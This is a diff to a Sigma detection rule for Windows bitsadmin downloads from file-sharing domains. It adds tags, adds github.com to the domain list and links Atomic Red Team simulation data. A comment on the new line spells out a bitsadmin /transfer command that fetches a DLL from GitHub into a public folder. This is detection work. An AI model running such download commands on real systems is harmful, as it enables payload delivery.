@@ -11,13 +11,15 @@ references:
     - https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/
 author: Florian Roth (Nextron Systems)
 date: 2022-06-28
-modified: 2024-08-22
+modified: 2025-12-10
 tags:
     - attack.defense-evasion
     - attack.persistence
     - attack.t1197
     - attack.s0190
     - attack.t1036.003
+    - attack.command-and-control
+    - attack.t1105
 logsource:
     category: process_creation
     product: windows
@@ -38,6 +40,7 @@ detection:
             - 'ddns.net'
             - 'dl.dropboxusercontent.com'
             - 'ghostbin.co'
+            - 'github.com' # bitsadmin /transfer n https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll %PUBLIC%\calc.dll
             - 'glitch.me'
             - 'gofile.io'
             - 'hastebin.com'
@@ -66,3 +69,9 @@ detection:
 falsepositives:
     - Some legitimate apps use this, but limited.
 level: high
+regression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_bitsadmin_download_file_sharing_domains/info.yml
+simulation:
+    - type: atomic-red-team
+      name: Windows - BITSAdmin BITS Download
+      technique: T1105
+      atomic_guid: a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b
